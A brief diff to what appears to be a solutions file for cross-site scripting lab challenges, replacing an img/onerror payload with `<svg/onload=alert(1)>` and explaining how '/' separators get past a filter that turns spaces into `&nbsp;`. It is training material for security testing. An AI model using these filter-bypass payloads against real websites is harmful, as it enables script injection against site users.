@@ -4,10 +4,10 @@ Whitespace-normalizing filters; pick delimiters that survive.
 
 ### whitespace-level1
 
-`/whitespace/level1/?query=%3Cimg/src=x/onerror=alert(1)%3E`
+`/whitespace/level1/?query=%3Csvg/onload=alert(1)%3E`
 
-- payload: `<img/src=x/onerror=alert(1)>`
-- context: spaces → `&nbsp;`; use `/` as attribute separator
+- payload: `<svg/onload=alert(1)>`
+- context: spaces → `&nbsp;`; use a one-attribute tag with `/` as separator
 
 ### whitespace-level2
 
